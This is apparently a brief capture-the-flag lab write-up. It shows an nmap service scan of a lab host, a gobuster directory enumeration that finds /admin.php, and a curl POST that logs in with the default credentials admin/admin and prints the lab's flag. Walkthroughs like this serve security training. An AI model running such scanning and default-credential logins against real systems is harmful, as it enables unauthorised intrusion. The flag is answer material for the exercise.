`nmap -sV 10.129.22.71`

```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-10 18:56 EDT
Nmap scan report for 10.129.22.71
Host is up (0.034s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -x php -u http://10.129.22.71 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.22.71
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/09/10 19:53:44 Starting gobuster in directory enumeration mode
===============================================================
/admin.php            (Status: 200) [Size: 999]
Progress: 3494 / 441122 (0.79%)               ^C
```

fun way
```
┌──(kali㉿kali)-[~]
└─$ curl -sSL -X POST  -H "Content-Type: application/x-www-form-urlencoded" -d 'username=admin&password=admin' http://10.129.17.15/admin.php | grep flag
<h4 style='text-align:center'>Congratulations! Your flag is: 6483bee07c1c1d57f14e5b0717503c73</h4>
```


